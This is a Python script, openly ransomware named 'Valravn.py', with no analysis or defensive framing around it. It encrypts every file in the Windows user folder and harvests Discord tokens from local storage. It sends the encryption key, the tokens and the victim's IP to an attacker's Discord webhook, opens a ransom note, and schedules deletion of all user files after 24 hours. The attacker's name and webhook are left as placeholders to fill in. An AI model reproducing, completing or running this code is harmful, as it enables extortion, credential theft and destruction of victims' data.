import os
import subprocess
from cryptography.fernet import Fernet
import re
import json
import requests
import time
import threading
from pathlib import Path

user = str(os.environ["USERNAME"])
pathds = "C:\\Users\\" + user + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb"
key = Fernet.generate_key()

def find_tokens(path):
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def timer():
    path1 = "C:\\\\Users\\\\" + user
    my_path = Path(path1)
    print("timer started")
    time.sleep(86400)
    for file in my_path.glob("**/*.*"):
        os.system("del " + file + " /s /f /q")

def crypt(filename):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def warn():
    name = "yourname" #change to your discord name and tag
    ip = requests.get('https://api.ipify.org').text
    url = "webhook" # webhook url 
    data = {}
    data["content"] = "Key Content for " + user + ": " + str(key) + " Discord tokens: " + " Stable client: " + str(find_tokens(pathds))
    data["username"] = ip
    requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
    f = open("ransom.txt", "w")
    f.write("Ooops you have been infected with Valravn.py! your files are encrypted! Contact " + name + " on discord to get your files back! You have 24 hours to contact me, after that, all your files will be deleted")
    f.close()
    subprocess.call(r"notepad ransom.txt", shell=False)

def main():
    timerthread = threading.Thread(target=timer)
    timerthread.start()
    print("pog")
    path1 = "C:\\\\Users\\\\" + user 
    my_path = Path(path1)
    for file in my_path.glob("**/*.*"):
        crypthtread = threading.Thread(target=crypt, args=[file])
        crypthtread.start()
    warn()

main()
